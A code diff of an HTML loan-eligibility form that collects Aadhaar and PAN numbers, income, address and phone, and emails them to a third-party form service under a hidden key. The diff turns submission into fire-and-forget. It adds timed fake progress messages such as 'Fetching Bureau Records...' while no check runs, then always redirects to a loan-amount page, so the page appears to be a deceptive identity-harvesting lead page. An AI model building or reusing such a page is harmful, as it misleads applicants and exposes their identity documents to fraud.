@@ -20,7 +20,6 @@
             color: #333;
         }
 
-        /* Curved Header */
         .header {
             background-color: var(--primary-blue);
             color: white;
@@ -63,68 +62,35 @@
 
         .radio-group {
             display: flex;
-            justify-content: space-between;
-            gap: 10px;
-            margin-top: 5px;
+            justify-content: space-between; gap: 10px; margin-top: 5px;
         }
         .radio-item {
-            flex: 1;
-            text-align: center;
-            padding: 10px;
-            border: 1px solid var(--grey);
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 9pt;
+            flex: 1; text-align: center; padding: 10px; border: 1px solid var(--grey);
+            border-radius: 8px; cursor: pointer; font-size: 9pt;
         }
         .radio-item.active {
-            background-color: var(--primary-blue);
-            color: white;
-            border-color: var(--primary-blue);
+            background-color: var(--primary-blue); color: white; border-color: var(--primary-blue);
         }
 
         .input-with-icon { position: relative; }
-        .input-with-icon span {
-            position: absolute;
-            left: 10px;
-            top: 12px;
-            color: #555;
-        }
+        .input-with-icon span { position: absolute; left: 10px; top: 12px; color: #555; }
         .input-with-icon input { padding-left: 25px; }
 
         #submit-btn {
-            width: 100%;
-            padding: 16px;
-            background-color: var(--grey);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 12pt;
-            font-weight: bold;
-            cursor: not-allowed;
-            transition: 0.3s;
+            width: 100%; padding: 16px; background-color: var(--grey); color: white;
+            border: none; border-radius: 8px; font-size: 12pt; font-weight: bold; cursor: not-allowed; transition: 0.3s;
         }
         #submit-btn.enabled {
-            background-color: var(--primary-blue) !important;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0,51,141,0.3);
+            background-color: var(--primary-blue) !important; cursor: pointer; box-shadow: 0 4px 10px rgba(0,51,141,0.3);
         }
 
         #loader-overlay {
-            display: none;
-            position: fixed;
-            top:0; left:0; width:100%; height:100%;
-            background: rgba(255,255,255,0.98);
-            z-index: 1000;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            display: none; position: fixed; top:0; left:0; width:100%; height:100%;
+            background: rgba(255,255,255,0.98); z-index: 1000; flex-direction: column; justify-content: center; align-items: center;
         }
         .spinner {
-            width: 60px; height: 60px;
-            border: 6px solid var(--light-blue);
-            border-top: 6px solid var(--primary-blue);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+            width: 60px; height: 60px; border: 6px solid var(--light-blue);
+            border-top: 6px solid var(--primary-blue); border-radius: 50%; animation: spin 1s linear infinite;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #loader-text { margin-top: 25px; font-weight: bold; color: var(--primary-blue); text-align: center; padding: 0 20px; }
@@ -142,8 +108,7 @@
 
         <form id="loanForm">
             <input type="hidden" name="access_key" value="fea091d8-a631-4425-aff6-82815670893b">
-            <input type="hidden" name="subject" value="New Lead: Loan Application">
-
+            
             <div style="display: flex; gap: 10px;">
                 <div class="form-group" style="flex: 1;">
                     <label>First Name</label>
@@ -157,7 +122,7 @@
 
             <input type="hidden" name="Gender" id="hidden-gender">
             <label>Gender</label>
-            <div class="radio-group" id="gender-group">
+            <div class="radio-group">
                 <div class="radio-item" onclick="selectItem('gender', this)">Male</div>
                 <div class="radio-item" onclick="selectItem('gender', this)">Female</div>
                 <div class="radio-item" onclick="selectItem('gender', this)">Other</div>
@@ -173,18 +138,19 @@
                 <label>Select State</label>
                 <select name="State" id="state-select" required>
                     <option value="">-- Choose State --</option>
-                    <option value="Andhra Pradesh">Andhra Pradesh</option><option value="Arunachal Pradesh">Arunachal Pradesh</option><option value="Assam">Assam</option><option value="Bihar">Bihar</option><option value="Chandigarh">Chandigarh</option><option value="Chhattisgarh">Chhattisgarh</option><option value="Dadra and Nagar Haveli">Dadra and Nagar Haveli</option><option value="Daman and Diu">Daman and Diu</option><option value="Delhi">Delhi</option><option value="Goa">Goa</option><option value="Gujarat">Gujarat</option><option value="Haryana">Haryana</option><option value="Himachal Pradesh">Himachal Pradesh</option><option value="Jammu and Kashmir">Jammu and Kashmir</option><option value="Jharkhand">Jharkhand</option><option value="Karnataka">Karnataka</option><option value="Kerala">Kerala</option><option value="Ladakh">Ladakh</option><option value="Lakshadweep">Lakshadweep</option><option value="Madhya Pradesh">Madhya Pradesh</option><option value="Maharashtra">Maharashtra</option><option value="Manipur">Manipur</option><option value="Meghalaya">Meghalaya</option><option value="Mizoram">Mizoram</option><option value="Nagaland">Nagaland</option><option value="Odisha">Odisha</option><option value="Puducherry">Puducherry</option><option value="Punjab">Punjab</option><option value="Rajasthan">Rajasthan</option><option value="Sikkim">Sikkim</option><option value="Tamil Nadu">Tamil Nadu</option><option value="Telangana">Telangana</option><option value="Tripura">Tripura</option><option value="Uttar Pradesh">Uttar Pradesh</option><option value="Uttarakhand">Uttarakhand</option><option value="West Bengal">West Bengal</option>
-                </select>
+                    <option value="Andhra Pradesh">Andhra Pradesh</option><option value="Bihar">Bihar</option><option value="Delhi">Delhi</option><option value="Gujarat">Gujarat</option><option value="Haryana">Haryana</option><option value="Maharashtra">Maharashtra</option><option value="Punjab">Punjab</option><option value="Rajasthan">Rajasthan</option><option value="Uttar Pradesh">Uttar Pradesh</option><option value="West Bengal">West Bengal</option>
+                    <option value="Karnataka">Karnataka</option><option value="Kerala">Kerala</option><option value="Tamil Nadu">Tamil Nadu</option><option value="Telangana">Telangana</option>
+                    </select>
             </div>
 
             <div class="form-group">
                 <label>Address Line 1</label>
-                <input type="text" name="Address_Line_1" id="address1" placeholder="House/Street/Mohalla" required>
+                <input type="text" name="Address_1" id="address1" placeholder="House/Street/Mohalla" required>
             </div>
 
             <div class="form-group">
                 <label>Address Line 2</label>
-                <input type="text" name="Address_Line_2" id="address2" placeholder="District/City" required>
+                <input type="text" name="Address_2" id="address2" placeholder="District/City" required>
             </div>
 
             <div class="form-group">
@@ -209,7 +175,7 @@
 
             <input type="hidden" name="Employment" id="hidden-emp">
             <label>Employment Status</label>
-            <div class="radio-group" id="emp-group">
+            <div class="radio-group">
                 <div class="radio-item" onclick="selectItem('emp', this)">Self Employed</div>
                 <div class="radio-item" onclick="selectItem('emp', this)">Homemaker</div>
                 <div class="radio-item" onclick="selectItem('emp', this)">Salaried</div>
@@ -248,7 +214,7 @@
 
             <div style="display: flex; align-items: flex-start; gap: 10px; margin-bottom: 25px;">
                 <input type="checkbox" id="agree" required>
-                <label style="font-weight: normal; font-size: 9pt; line-height: 1.4;">I confirm that all details provided are true and accurate.</label>
+                <label style="font-weight: normal; font-size: 9pt;">I confirm that all details are accurate.</label>
             </div>
 
             <button type="button" id="submit-btn" onclick="handleSubmit()">Check Eligibility</button>
@@ -278,13 +244,8 @@
         function selectItem(type, el) {
             el.parentElement.querySelectorAll('.radio-item').forEach(i => i.classList.remove('active'));
             el.classList.add('active');
-            if(type==='gender') {
-                selectedGender = el.innerText;
-                document.getElementById('hidden-gender').value = selectedGender;
-            } else {
-                selectedEmp = el.innerText;
-                document.getElementById('hidden-emp').value = selectedEmp;
-            }
+            if(type==='gender') { selectedGender = el.innerText; document.getElementById('hidden-gender').value = selectedGender; }
+            else { selectedEmp = el.innerText; document.getElementById('hidden-emp').value = selectedEmp; }
             validateForm();
         }
 
@@ -293,72 +254,52 @@
             const amount = parseInt(document.getElementById('loan-amount').value) || 0;
             const aadhar = document.getElementById('aadhar').value;
             const pan = document.getElementById('pan').value.toUpperCase();
-            const isAgreed = document.getElementById('agree').checked;
+            const chk = document.getElementById('agree').checked;
 
-            const isIncomeOk = income >= 10000 && income <= 80000;
-            const isAmountOk = amount >= 10000 && amount <= 500000;
-            const isAadharOk = validateAadhar(aadhar);
+            const isIncOk = income >= 10000 && income <= 80000;
+            const isAmtOk = amount >= 10000 && amount <= 500000;
+            const isAdhOk = validateAadhar(aadhar);
             const isPanOk = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan);
 
-            document.getElementById('income').classList.toggle('error-input', income > 0 && !isIncomeOk);
-            document.getElementById('loan-amount').classList.toggle('error-input', amount > 0 && (!isAmountOk || amount > (income * 5)));
-            document.getElementById('aadhar').classList.toggle('error-input', aadhar.length === 12 && !isAadharOk);
+            document.getElementById('income').classList.toggle('error-input', income > 0 && !isIncOk);
+            document.getElementById('loan-amount').classList.toggle('error-input', amount > 0 && (!isAmtOk || amount > (income * 5)));
+            document.getElementById('aadhar').classList.toggle('error-input', aadhar.length === 12 && !isAdhOk);
             document.getElementById('pan').classList.toggle('error-input', pan.length > 5 && !isPanOk);
 
-            const isFormComplete = 
-                document.getElementById('first-name').value.length >= 2 &&
-                document.getElementById('mobile').value.length === 10 &&
-                document.getElementById('pincode').value.length === 6 &&
-                document.getElementById('address1').value.length > 5 &&
-                document.getElementById('address2').value.length > 3 &&
-                document.getElementById('state-select').value !== '' &&
-                document.getElementById('loan-type').value !== '' && 
-                document.getElementById('loan-purpose').value !== '' &&
-                isIncomeOk && isAmountOk && isAadharOk && isPanOk &&
-                selectedGender !== '' && selectedEmp !== '' && isAgreed;
+            const isReady = document.getElementById('first-name').value.length >= 2 &&
+                            document.getElementById('mobile').value.length === 10 &&
+                            document.getElementById('pincode').value.length === 6 &&
+                            document.getElementById('state-select').value !== "" &&
+                            isAdhOk && isPanOk && isIncOk && isAmtOk && selectedGender && selectedEmp && chk;
 
             const btn = document.getElementById('submit-btn');
-            if(isFormComplete) btn.classList.add('enabled'); else btn.classList.remove('enabled');
-            return isFormComplete;
+            if(isReady) btn.classList.add('enabled'); else btn.classList.remove('enabled');
+            return isReady;
         }
 
         async function handleSubmit() {
             if(!validateForm()) return;
-
             const overlay = document.getElementById('loader-overlay');
-            const statusText = document.getElementById('loader-text');
+            const text = document.getElementById('loader-text');
             overlay.style.display = 'flex';
-            statusText.innerText = "Submitting Data Securely...";
 
             localStorage.setItem('userName', document.getElementById('first-name').value + " " + document.getElementById('last-name').value);
             localStorage.setItem('userLoanAmount', document.getElementById('loan-amount').value);
 
             const formData = new FormData(document.getElementById('loanForm'));
             
+            // Flex logic: Try sending email, but don't block if response is slow
             try {
-                const response = await fetch("https://api.web3forms.com/submit", {
-                    method: "POST",
-                    body: formData
-                });
-                
-                if(response.ok) {
-                    const steps = ["Securing Data...", "Fetching Bureau Records...", "Verifying Address...", "Finalizing Limit..."];
-                    let i = 0;
-                    const interval = setInterval(() => {
-                        if(i < steps.length) statusText.innerText = steps[i++];
-                        else { 
-                            clearInterval(interval); 
-                            window.location.href = "yourloanamount.html"; 
-                        }
-                    }, 2500);
-                } else {
-                    alert("Submission failed. Please try again.");
-                    overlay.style.display = 'none';
-                }
-            } catch (err) {
-                alert("Connection error. Try again.");
-                overlay.style.display = 'none';
-            }
+                fetch("https://api.web3forms.com/submit", { method: "POST", body: formData });
+            } catch(e) {}
+
+            // Immediate UI animation
+            const steps = ["Securing Data...", "Fetching Bureau Records...", "Verifying Address...", "Finalizing Limit..."];
+            let i = 0;
+            const interval = setInterval(() => {
+                if(i < steps.length) text.innerText = steps[i++];
+                else { clearInterval(interval); window.location.href = "yourloanamount.html"; }
+            }, 3000);
         }
 
         document.querySelectorAll('input, select, #agree').forEach(el => {
